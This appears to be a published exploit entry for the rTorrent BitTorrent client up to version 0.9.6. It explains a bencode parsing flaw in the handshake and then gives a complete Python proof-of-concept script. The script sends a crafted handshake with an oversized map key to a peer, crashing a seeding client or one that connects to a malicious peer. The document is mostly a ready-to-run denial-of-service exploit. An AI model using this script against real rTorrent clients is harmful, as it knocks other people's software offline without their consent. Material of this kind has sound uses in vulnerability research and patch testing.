# Exploit Author: ecx86
# Vendor Homepage: http://rtorrent.net
# Software Link: https://github.com/rakshasa/rtorrent/releases
# Version: <= 0.9.6
# Tested on: Debian GNU/Linux 9.4 (stretch)
 
# This crash is due to a bad bencode parse of the handshake data map.
# Specifically, by providing a massive length for a string, namely the key of a map entry,
# malloc fails, returning 0, which is passed to a memcpy call that causes the segfault.
# This can be triggered actively by sending the crash-triggering data to a seeding rtorrent
# client, or when a downloading rtorrent client connects to a malicious peer.
 
#!/usr/bin/env python
import socket
import struct
 
crash = &#039;&#039;
proto_name = &#039;BitTorrent protocol&#039;
crash += chr(len(proto_name)) + proto_name # magic
crash += &#039;00000000&#039; # reserved extension bytes
 
# sha1 hash of info dictionary
# change this depending on your torrent
crash += &#039;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#039;
 
crash += &#039;00000000000000000000&#039; # peer id
 
msg = &#039;&#039;
msg += struct.pack(&#039;<H&#039;, 20) # message type: extended
msg += &#039;d99999999999999999999999999999999:&#039; # payload
 
crash += struct.pack(&#039;>I&#039;, len(msg))
crash += msg
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((&#039;1.3.3.7&#039;, 6890))
s.send(crash)
s.close()

